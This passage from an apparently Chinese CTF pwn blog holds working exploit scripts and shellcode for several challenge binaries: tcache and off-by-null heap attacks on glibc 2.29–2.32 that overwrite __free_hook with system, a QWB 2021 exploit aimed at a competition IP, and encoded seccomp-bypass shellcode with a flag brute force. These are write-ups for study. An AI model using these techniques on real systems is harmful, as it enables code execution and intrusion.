'\\x00'))\n    #--------------------------------------------\n    \n    \n    new(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\n    new(0x18,p16(0x66c0))\n    new(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n    #new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n    #this will be OK\n    main_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\n    test = main_arena>>40\n    log.info(\"main_arena:0x%x\"%main_arena)\n    log.info(\"test:0x%x\"%test)\n    if(test != 0x7f):\n        return\n    malloc_hook = main_arena-0x10\n    obj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n    libc_base = malloc_hook-obj.dump('__malloc_hook')\n    #stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n    # log.info(\"stdout_addr:0x%x\"%stdout_addr)\n    # obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n    # libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\n    system_addr = libc_base + obj.dump(\"system\")\n    __free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x18,'PIG007NB')\n    new(0x18,'PIG007NB')\n\n\n    #one_gadget = libc_base + 0xdf54c\n    new(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\n    new(0x38, p64(system_addr))\n    new(0x38, p64(system_addr))\n\n    new(0x10, '/bin/sh\\x00')\n    pause()\n    free()\n    p.interactive()\n\ncount = 1\nwhile True:\n    try:\n        print('the no.' + str(count) + ' try')\n        p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n        #p = remote('node3.buuoj.cn', 26018)#process('./ff') #\n        exp()\n        \n    except Exception as e:\n    \tprint(e)\n        p.close()\n        count = count + 1\n        continue\n```\n\n \n\n▲总结一下：\n\n(1)IO_FILE的新知识：\n\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n\n(2)2.32Tcache机制：\n\n①放入tcache对应bin链表时会异或heap_base/0x1000，并且fd也会变化。\n\n②bin链表中的count和申请与否的关系：\n\n如果tcache的对应bin的count为0，则不会从该Tcache中申请。\n\n如果大于等于1，那么就需要看tcache结构体上对应bin链表存放的chunk地址是否为一个合法的了，如果不合法则会申请失败，程序退出。(应该都是这样的)\n\n③需要修改Key字段才能double free，即free 的时候会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache的bin上，如果在则视为程序在 double free，进而终止程序。\n\n","tags":["Tcache"],"categories":["PWN","pwn堆-Tcache"]},{"title":"2.29下的off-by-null","url":"/2021/08/14/2.29下的off-by-null/","content":"\n△相比2.29之前的版本中，在向上合并时加了一项检查：\n\n```\n#注释头\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n就是检查上一个chunk的size是否等于当前chunk的pre_size。之前的off-by-null肯定是不等于的啊，所以这里就一定会出错。那么2.29的绕过方法就是通过smallbin和largebin来伪造一个chunk，满足：\n\n```\n#注释头\n\n①fake_chunk->fd->bk == fake_chunk_addr\n②fake_chunk->bk->fd == fake_chunk_addr\n③fake_chunk->size = trigger_chunk->pre_size\n```\n\n其中③用来过新增加的检查：\n\n```\n#注释头\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n①和②用来过unlink中的检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\n    malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\n这样就能够成功off-by-null了，图示如下(用了[t1an5g的博客](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)的图片，侵删)：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png)\n\n1.下面简单说下流程：\n\n(1)进行一定的堆布局，使得起作用的chunk的堆地址为0xx...x0010，同时也方便计算偏移，从而进行低位字节覆盖。\n\n(2)通过largebin的fd_nextsize指针和bk_nextsize指针，加上字节覆盖使得fake_chunk的fd指针指向指定FD(即下面的chunk18)，fake_chunk的bk指针指向指定BK(即下面的chunk17)。\n\n(3)通过fastbin和smallbin的连用，加上字节覆盖使得FD(chunk18)的bk指针指向fake_chunk。\n\n(4)通过fastbin加上字节覆盖使得BK(chunk17)的fd指针指向fake_chunk。\n\n(5)进行完以上操作就得到类似上图的堆布局，之后就可以绕过检查，触发off-by-null。\n\n2.详细介绍一下具体实现方法：\n\n(1)先申请17个chunk,chunk0-chunk16，其中chunk0-chunk7用来进行堆布局，使得后面的chunk15的地址为0xx..x0010，即使得申请的堆地址的第二个字节为\"\\x00\"，以便之后覆盖的时候不用进行一字节爆破，从而进行对抗off-by-null的0字节溢出。当然，如果条件限制的话， 其实是可以不用chunk0-chunk7的布局，用一字节爆破来解决问题。chunk8-chunk14大小为0x28，用来填充0x30大小的tcache。chunk15即关键部分，chunk16防止合并。\n\n(2)释放chunk15，size应该大于tcache的最大size，这里的chunk15最好设置大一点，大佬的博客设置了0xb20大小。然后chunk15就会进入unsortedbin中，由于unsortedbin中只有一个chunk15，所以chunk15的指针会有以下效果：\n\n```\n#注释头\n\nchunk15->fd == main_arena+88(unsortebin_addr)\nchunk15->bk == main_arena+88\n```\n\n(3)申请一个0x28大小的chunk17，同时由于此时bin中没有chunk，只有Unsortedbin才有chunk15，所以会将chunk15先放入largebin中，之后再从chunk15中切割，返回chunk17，所以此时chunk15在largebin中，又只有它一个chunk，由于放入largebin的赋值语句，所以在切割之前会变成：\n\n```\n#注释头\n\nchunk15->fd == largebin_addr\nchunk15->bk == largebin_addr\nchunk15->fd_nextsize == chunk15_addr\nchunk15->bk_nextsize == chunk15_addr\n```\n\n切割之后，chunk17获得了chunk15残留下来的fd，bk，fd_nextsize，bk_nextsize。因为chunk17是用来构造fake_chunk的，所以大小需要至少有0x20。那么此时的chunk17中内容就会如下：\n\n```\n#注释头\n\nchunk17->fd == largebin_addr\nchunk17->bk == largebin_addr\nchunk17->fd_nextsize == chunk17_addr\nchunk17->bk_nextsize == chunk17_addr\n```\n\n然后构造在chunk17里制作fake_chunk，满足：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\n```\n\n这里需要进行赋值：\n\n```\n#注释头\n\nchunk17->fd = trigger_chunk->pre_size\nchunk17->fd_nextsize = \"\\x40\"\n```\n\n(后面会讲到为什么会这么赋值)之后的fake_chunk的bk自动继承了之前残留下来的指针。\n\n(4)申请chunk18-chunk21，大小为0x28。使得chunk18-chunk21都是从chunk15中切割出来的，之后用chunk8-chunk14填满0x30的tcache，然后再顺序释放chunk20和chunk18，使得chunk18,chunk20进入fastbin(0x30)中，顺序为chunk18->chunk20。\n\n(5)将chunk8-chunk14申请出来，清空tcache(0x30)，然后再申请一个0x400大小的chunk(超过smallbin大小即可)，这样就会将fastbin中的chunk，也就是chunk18和chunk20放入到smallbin中。由于smallbin和fastbin刚好相反，一个是FIFO一个是FILO，所以顺序会反过来，变成：chunk20->chunk18，但同时由于是bk寻址，所以再申请chunk会先把chunk18取出来，同时在smallbin中，那么就会满足chunk18->bk == chunk20_addr\n\n(6)此时赋值chunk18->bk = fake_chunk_addr，这里不用知道堆地址，因为我们知道chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))。所以之前chunk0-chunk7就可以进行一些大小布局，使得chunk15_addr == 0xx...x0010，那么fake_chunk_addr == 0xx...x0020，chunk20_addr == 0xx...x00a0，这样我们就只需要把0xa0覆盖成0x20，也就是修改chunk18->bk的第一个字节为0x20即可。但同时由于off by null的关系，修改chunk18->bk的第一个字节势必会导致第二个字节为\"\\x00\"，所以我们之前的堆布局也要使得chunk15_addr的第二个字节为\"\\x00\"才可以。\n\n那么现在也可以理解之前的一个赋值语句：chunk17->fd_nextsize = \"\\x40\"，这里就是为了将\"\\x10\"覆盖为\"\\x40\"使其指向chunk18，同时使得第二个字节也为\"\\x00\"。\n\n这样就满足了：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchun18->bk == fake_chunk_addr\nchunk17->fd == chunk18_addr\n```\n\n但是chunk17->fd不等于fake_chunk_addr。那么同样的操作再来一次，利用chunk17和chunk19，使其进入fastbin，将chunk17的fd指向chunk19，然后再申请回来，覆盖chunk17的fd指针，0x70覆盖为0x20即可。(由于2.29下的tcache会有key字段，使得chunk17的bk指针被修改，相当于修改fake_chunk的size位，这不是我们想看到的，所以还是用fastbin比较好)流程如下：\n\n①将chunk20从tcache中申请出来，防止之后不好操作，然后再将chunk8-chunk14放入tcache中，使得之后的chunk进入fastbin。\n\n②顺序释放chunk19，chunk17，使其进入fastbin中，使得chunk17->fd == chunk19_addr，就是0xx...x70。\n\n③然后将chunk8-chunk14申请回来，再将chunk17申请回来，覆盖chunk17的fd的第一个字节为0x20，那么就可以满足总的条件：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchunk18->bk == fake_chunk_addr\nchunk17->fd == fake_chunk_addr\n```\n\n(7)最后将chunk19申请回来，再从chunk15剩下的部分申请chunk22用来溢出。再申请chunk23将chunk15遗留的部分都申请回来，溢出之后释放掉，即可触发off by null，向上合并最初的chunk15-0x10大小的chunk，使得fake_chunk，chunk18,chunk19,chunk20,chunk21,chunk22,chunk23都被置入unsortedbin中。利用chunk8-chunk14对抗tcache，就可以随便玩了。(注意这里不需要像之前版本的off by null一样，还需要释放掉chunk0来绕过unlink检查，之前是因为不检查size位，所以直接释放掉即可。这里的fake_chunk已经替代了chunk0的作用，能够绕过Unlink的检查和size位的检查)\n\n3.最后模拟一下代码，同样参考了大佬[t1an5g的博客](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)：\n\n(1)前期准备加堆布局:\n\n```python\n#注释头\n\nfor i in range(7): # 0-6\n    add(0x1000, \"padding\")\nadd(0x1000-0x410, \"padding\") # 7\n\nfor i in range(7): # 8-14\n    add(0x28, 'tcache')\n\n#crux chunk15\nadd(0xb20, \"largebin\") # 15\n\n#prevent merge\nadd(0x10, \"padding\") # 16\n```\n\n(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:\n\n```python\n#注释头\n\ndelete(15)\n\n#chunk15 to largebin\nadd(0x1000, '\\n') \n\n#make fake_chunk in chunk17\nadd(0x28, p64(0) + p64(0x521) + p8(0x40))\n```\n\n(3)联动fastbin和smallbin：\n\n```python\n#注释头\n\nadd(0x28, 'a') # 18\nadd(0x28, 'b') # 19\nadd(0x28, 'c') # 20\nadd(0x28, 'd') # 21\n\n# fill in tcache(0x30)\nfor i in range(7): # 8-14\n    delete(8 + i)\n\ndelete(20)\ndelete(18)\n\n# clear tcache(0x30)\nfor i in range(7): # 8-14\n    add(0x28, 'padding')\n\n# fastbin to smallbin\nadd(0x400, 'padding')\n\n# get chunk18 from smallbin ,chunk20 to tcache\n# change chunk18->bk to point to fake_chunk\nadd(0x28, p64(0) + p8(0x20))\n```\n\n(4)利用fastbin修改chunk17->fd：\n\n```python\n#注释头\n\n# clear chunk from tcache\nadd(0x28, 'clear') # 20 from tcache\n\nfor i in range(7): # 8-14\n    delete(8 + i)\n\n# free to fastbin\ndelete(19)\ndelete(17)\n\nfor i in range(7): # 8-14\n    add(0x28, '\\n')\n\n# change chunk17->fd to point to fake_chunk\nadd(0x28, p8(0x20))\n```\n\n(5)触发off-by-null:\n\n```python\n#注释头\n\nadd(0x28, \"clear\")#19 from fastbin\n\nadd(0x28, \"a\") # 22 cutting from chunk15 in unsortebin,for overwrite\nadd(0x5f8, \"a\") # 23 legacy from chunk15 in unsortebin,for trigger off-by-null\nadd(0x100, \"padding\") # 24\n\n# off-by-null \nedit(22, \"a\"*0x20 + p64(0x520))\n\n# trigger\ndelete(23)\n```\n\n△以上的chunk索引对于题目具体分析，不同题目对索引的处理肯定不一样。\n\n其实还有其他只利用unsortedbin和largebin的绕过，贴一下地址：\n\nhttps://www.anquanke.com/post/id/236078#h3-14\n\n后面再来啃吧。\n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"2021-QWB","url":"/2021/08/14/2021-QWB/","content":"\n一、baby_diary\n\n2.31下的off-by-null，多溢出半个字节，所以总共需要爆破一个字节。这里还需要绕过read的检查，不过我这个布局完之后刚好可以通过，也就没太管了。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./baby_diary\"\nlibc_file = \"./libc-2.31.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\nmenu = \">> \"\n\n\ndef add(size, con):\n\tsla(menu, \"1\")\n\tsla(\"size: \", str(size))\n\tsla(\"content: \", con)\n\ndef delete(idx):\n\tsla(menu, \"3\")\n\tsla(\"index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"2\")\n\tsla(\"index: \", str(idx))\n\n\ndef pwn():\n\n\n    #(1)前期准备加堆布局:\n    for i in range(7): # 0-6\n        add(0x2000-1, \"/bin/sh\\x00\")\n    add(0x2000-0x1410-0x40-1, \"padding\") # 7\n\n    for i in range(7): # 8-14\n        add(0x28-1, 'tcache')\n\n    #crux chunk15\n    add(0xb20-1, \"largebin\") # 15\n    #prevent merge\n    add(0x10-1, \"padding\") # 16\n\n\n\n\n    #(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:\n    delete(15)\n\n    #chunk15 to largebin\n    add(0x1000-1, '\\n') #15\n    #make fake_chunk in chunk17\n    add(0x28-1, p64(0x6) + p64(0x601) + p8(0x40)) #17\n\n\n\n    #(3)联动fastbin和smallbin：\n    add(0x28-1, '\\x18') # 18\n    add(0x28-1, '\\xaa') # 19\n    add(0x28-1, '\\x20') # 20\n    add(0x28-1, '\\x21') # 21\n    # fill in tcache(0x30)\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    delete(20)\n    delete(18)\n\n    # clear tcache(0x30)\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # fastbin to smallbin\n    add(0x400-1, '\\x20') #18\n\n    # get chunk18 from smallbin ,chunk20 to tcache\n    # change chunk18->bk to point to fake_chunk\n    add(0x28-1, p64(0) + p8(0x20)) #20\n\n\n\n    #(4)利用fastbin修改chunk17->fd：\n    # clear chunk from tcache\n    add(0x28-1, 'clear') # 21 from tcache \n\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    # free to fastbin\n    delete(19)\n    delete(17)\n\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # change chunk17->fd to point to fake_chunk\n    add(0x28-1, p8(0x20)) #17\n\n\n    #(5)触发off-by-null:\n    add(0x28-1, \"\\x19\")# 19 from fastbin\n    show(19)\n\n    add(0x108-1, \"\\x23\") # 23 cutting from chunk15 in unsortebin,for overwrite\n    add(0x518-1, \"\\x24\") # 24 legacy from chunk15 in unsortebin,for trigger off-by-null\n    #add(0x100-1, \"padding\") # 24\n    # off-by-null \n\n    delete(23)\n    add(0x108-1,p64(0x0)*0x21)\n    delete(23)\n    add(0x108-1,p64(0x0)*0x1f+\"\\x00\"*7+\"\\x06\")\n    #edit(22, \"a\"*0x20 + p64(0x520))\n    # trigger\n    delete(24)\n    add(0x4e8-1,\"padding\")\n    show(23)\n    ru(\"content: \")\n    main_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n    malloc_hook = main_arena-0x10\n    libc_base = malloc_hook - libc.sym['__malloc_hook']\n    free_hook = libc_base + libc.sym['__free_hook']\n    system_addr = libc_base + libc.sym['system']\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"libc_base:0x%x\"%libc_base)\n\n    delete(24)\n    delete(1)\n    delete(2)\n    delete(3)\n    delete(8)\n    delete(19)\n    add(0x4e8-1,p64(0x30)*8+p64(0x30)+p64(0x31)+p64(free_hook))\n    add(0x28-1,\"padding\")\n    add(0x28-1,p64(system_addr))\n    delete(0)\n    p.interactive()\n    #add(0x18-1,\"A\")\n    #add(0x18-1,\"B\")\n    #delete(0)\n    #add(0x18-1,p64(0x0)*2+(\"\\x30\"+\"\\x20\").ljust(8,\"\\x00\"))\n    #pause()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    #p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    p = remote(\"8.140.114.72\",1399)\n    try:\n        pwn()\n        p.recv(timeout = 0.5) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n        EOFError\n    except EOFError:\n        p.close()\n        continue\n    else:\n        sleep(0.1)\n        p.sendline(\"1\")\n        pause()\n        break\n```\n\n \n\n二、shellcode：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png)\n\n只有系统号0x9,0x5,0x25,0x0,0xe7才能正常被执行，而0x5在32位下是open，即可以利用到open，mmap，和read函数。对于ORW少了一个W，可以使用flag的逐个字符比较的方法来爆破出flag。由于切换retfq需要涉及到构造32位的栈地址，所以这里最好还是用mmap来申请指定位置的一片空间，从而劫持栈。\n\n(1)mmap的设置：\n\n```python\nshellcode_mmap = '''\n/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/\nxor rax,rax\n\n/*set rdx*/\nmov al,0x7\npush rax\npop rdx\n\n/*set rcx*/\nmov al,0x22\npush rax\npop rcx\n\n/*set rdi*/\nxor rdi,rdi\nmov edi,0x40404040\n\n/*set rsi*/\nmov al,0x7e\npush rax\npop rsi\n\n/*set rax*/\nmov al,0x9\n\n/*set r8,r9*/\nxor r8,r8\nxor r9,r9\n\nsyscall\n'''\n```\n\n这里由于对输入字符做了限制，只能是可见字符，同时由于这里使用alpha3这个工具来将shellcode编码成可见字符。但是这个工具有一个缺点，就是不能出现\\x00这个字符，所以如果我们使用mov rax,0x9则使得0x9在64位是0x0000000000000009，存在\\x00字符，所以需要用到al,dl,等8位寄存器，来转换一下。\n\n(2)read的设置：\n\n```python\nshellcode_read = '''\n/*read(0,0x40404040,0x70)*/\nxor rax,rax\nxor rdi,rdi\nxor rsi,rsi\nmov esi,0x40404040\nxor rdx,rdx\nmov dl,0x70\nsyscall\n'''\n```\n\n读入到之前用mmap开辟的空间0x40404040处。\n\n(3)retfq的设置：\n\n```python\nshellcode_retfq = '''\nmov esp,0x40404440\npush 0x23\npush 0x40404040\nretfq\n'''\n```\n\n①需要32位的栈，同时劫持esp，使得栈上的完全可控，防止push出错。\n\n②这里0x23为转32位，0x33为转64位。\n\n③push 0x40404040是在retfq之后跳转的地方，需要放到栈上。\n\n▲汇编点：存在xor,mov,retfq多的时候，需要是：shellcode_x64 = asm(shellcode_x64,arch = 'amd64',os='linux')才行。\n\n以上的很多不太知道原理，具体的在具体用到时候再改。\n\n(4)orw中的or设置：\n\n```python\nshellcode_open = '''\nmov eax, 5\npush 0x67616c66\nmov ebx, esp\nxor ecx, ecx\nint 0x80\nmov ecx, eax\n'''\n\nshellcode_to64 = '''\npush 0x33\npush 0x4040402b\nretfq\n'''\n\nshellcode_read_flag = '''\nmov rdi,rcx\nmov rsi,rsp\nmov rdx,0x70\nxor rax,rax\nsyscall\n'''\n```\n\n(5)爆破的汇编代码设置：\n\n```python\nif flag_pos == 0:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-4; ret\".format(flag_pos, ch)\nelse:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-5; ret\".format(flag_pos, ch)\n```\n\n这里的ch即为循环的可见字符，flag_pos是读出flag的对应位置，但是原理就是将读取的flag遍历比较所有可见字符，相等则使得程序跳入循环中，然后就可以通过设置timeout为某个值来判断这个字符是否相等，相等则加入到flag中。类似的有：\n\n```python\ncheck = '''\nmov dl, byte ptr [rsi+{}]\nmov cl, {}\ncmp cl,dl\njz loop\nmov al,231\nsyscall\nloop:\njmp loop\n'''.format(reloc,ch)\n```\n\n这里就用到了exit_group，另外rsp,rsi,甚至rbx都可以的，因为读取之后这三个寄存器都保存了flag的值：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png)\n\n(6)汇总：\n\n```python\n#注释头\n\nfrom pwn import * \n\nshellcode_open = '''\n    mov eax, 5\n    push 0x67616c66\n    mov ebx, esp\n    xor ecx, ecx\n    int 0x80\n    mov ecx, eax\n    '''\n\nshellcode_to64 = ''' \n    push 0x33\n    push 0x4040405b\n    retfq\n'''\n\nshellcode_read_flag = '''\n    mov rdi,rcx\n    mov rsi,rsp\n    mov rdx,0x70\n    xor rax,rax\n    syscall\n'''\n\nshellcode_open = asm(shellcode_open)\nshellcode_to64 = asm(shellcode_to64,arch = 'amd64',os = 'linux')\nshellcode_read_flag = asm(shellcode_read_flag,arch = 'amd64',os = 'linux')\n\n\ndef pwn(p, flag_pos, ch):\n        payload = \"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y\"\n        p.sendline(payload)\n        sc = asm('''\n        mov dl, byte ptr [rsi+{}]\n        mov cl, {}\n        cmp cl,dl\n        jz loop\n        mov al,231\n        syscall\n        loop:\n        jmp loop\n        '''.format(flag_pos,ch),arch = 'amd64',os = 'linux')\n\n        if flag_pos == 0:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-4; ret\".format(flag_pos, ch)\n        else:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-5; ret\".format(flag_pos, ch)\n        check = asm(shellcode, arch='amd64', os='linux')\n\n        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check \n        #pause()\n        p.send(payload)\n        #pause()\n\nmy_flag = \"\"\nflag_pos = 0\nwhile True:\n    for ch in range(33, 127):\n        #p = remote(\"39.105.137.118\", 50050)\n        p = process(\"./shellcode\")\n        try:\n            print(ch)\n            pwn(p, flag_pos, ch)\n            p.recvline(timeout=3.0)\n            my_flag = my_flag + chr(ch)\n            print(\"=>\", my_flag)\n            flag_pos += 1\n            p.close()\n            break\n        except EOFError:\n            ch += 1\n            p.close()\n    if(my_flag[-1] == '}'):\n        break\nlog.info(\"flag:%s\"%my_flag)\n```\n\n \n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"360ichunqiu 2017-smallest","url":"/2021/08/14/360ichunqiu 2017-smallest/","content":"\n1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。\n\n2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个syscall系统调用的就是read函数，读取的数取直接存入栈顶。由于buf大小为400h，且只有一个syscall，之后直接retn，没有leave指令，这就代表了rsp指向的地址就是我们执行完syscall后start函数retn的返回地址(pop eip)。也就是如果输入一个地址，读取完之后，通过retn就会跳转到该地址中。另外程序中除了retn之外没有其它对栈帧进行操作的指令，如果输入多个syscall地址，就可以反复执行syscall。并且最开始输入400h字节，程序流完全可控。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg)\n\n3.首先想到rop，但是题目没给Libc，并且通过调试发现，这个程序压根就没导入外部的Libc库，IDA中打开没有extern，完全没办法常规rop，那么想用SROP。远程调试一下查看堆栈数据，发现临时创建的smallest段数据没有可写权限，能够利用的只有[stack]栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据binsh从而调用execve(‘/bin/sh\\x00’，0，0)来直接getshell。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg)\n\n4.之后观察栈上的数据，发现当运行到syscall时，rsp下方的内容全是栈上的地址。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg)\n\nrbp一直都是0x000......这是因为程序只有一个start函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用sys_write函数，来打印rsp指向的内容，也就是某个栈地址，这样就成功泄露栈地址。\n\n5.但是sys_write的调用号是1，而通过调试发现rax的初始值被默认设置为0，并且程序中没有任何修改rax的代码。唯一一个也只有xor   rax, rax，但是任何数和本身异或的结果都是0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是0，也就是会无限循环read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后retn会直接跳转到rsp的下一行。这里选择让程序再执行一次sys_read函数，之后我们为其中一次输入一个字节，并且这次返回不再从xor这行代码开始执行，从mov rsi, rsp开始。由于sys_read的返回值自动写回给rax(一般函数的返回值都会写给rax)，所以读取几个字节read就向rax写入多少，这样就会使得rax也可以得到控制，不再被xor为0，调用我们想调用的系统函数。\n\n6.所以编写payload:先尝试一下看能否泄露栈地址，test1.py\n\n```\n#注释头\n\npayload = \"\"\npayload += p64(start_addr)\npayload += p64(set_rsi_rdi_addr)\npayload += p64(start_addr)\n#泄露栈地址之后返回到start，执行下一步操作。\nio.send(payload)\nsleep(3)\nio.send(payload[8:8+1])\n```\n\n\\#利用sys_read随便读取一个字符，设置rax = 1，由于retn关系，rsp下拉了一个单位，所以这里会读入到原先的rsp+0x8处，也就是从原先的Payload中第8个字符开始，抽取一个字符，就是set_rsi_rdi_addr的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\\xb8’)效果一样，都是为了不改变返回地址。之后再执行set_rsi_rdi_addr从而执行write函数，\n\n```\n#注释头\n\nstack_addr = u64(io.recv()[8:16]) + 0x100\n#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖\nlog.info('stack addr = %#x' %(stack_addr))\n```\n\n7.这里可以看到成功泄露了一个栈地址，但是不能再用简单读入binsh字符串之后设置SigreturnFrame结构体来getshell，因为这里设置读入地址是通过rsp设置的。如果将rsp设置为我们想读入binsh的栈地址，那么肯定是可以读入binsh字符串的，但是当程序运行到retn时，跳转的是binsh这个地址，这是不合法的，没办法跳转，程序会崩溃。\n\n这里就考虑使用SigreturnFrame()来进行栈劫持，将整个栈挪移到目的地。\n\n(1)首先布置SigreturnFrame()的栈空间，进行栈劫持：\n\n```\n#注释头\n\nframe_read = SigreturnFrame() \n#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot\nframe_read.rax = constants.SYS_read#调用read读取payload2\nframe_read.rdi = 0#fd参数\nframe_read.rsi = stack_addr#读取payload2到rsi处\nframe_read.rdx = 0x300#读取长度为0x300\n#读取的大小\nframe_read.rsp = 